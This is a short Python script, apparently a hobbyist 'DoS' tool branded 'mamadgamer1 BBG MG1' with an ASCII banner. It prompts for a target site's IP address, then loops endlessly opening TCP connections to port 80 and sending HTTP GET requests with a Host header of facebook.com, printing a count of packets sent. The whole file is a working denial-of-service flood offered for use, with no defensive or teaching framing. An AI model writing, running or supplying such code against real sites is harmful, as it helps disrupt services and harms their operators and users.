from socket import *
from colorama import Fore , init
init()
import time
print(Fore.GREEN + """
    
    
    █▀▄▀█ █▀▀█ █▀▄▀█ █▀▀█ █▀▀▄ █▀▀▀ █▀▀█ █▀▄▀█ █▀▀ █▀▀█ ▄█─ 
    █─▀─█ █▄▄█ █─▀─█ █▄▄█ █──█ █─▀█ █▄▄█ █─▀─█ █▀▀ █▄▄▀ ─█─ 
    ▀───▀ ▀──▀ ▀───▀ ▀──▀ ▀▀▀─ ▀▀▀▀ ▀──▀ ▀───▀ ▀▀▀ ▀─▀▀ ▄█▄

    """)
print(Fore.RED +"")
print("\nDos By mamadgamer1 BBG MG1")
dos = input("\nEnter the site ip to send packets ==> ")
#example: 8.8.8.8
time.sleep(2)

m = 0

while True: 

   s = socket(AF_INET , SOCK_STREAM)
   s.connect((dos,80))
   s.send("GET / HTTP/1.1\r\nHost:facebook.com\r\n\r\n".encode(encoding='utf-8')) #facebook host
   m = m + 1
   print(Fore.BLUE+"packets has been send ... [  mamadgamer1 BBG MG1  ]",m)
   s.close()
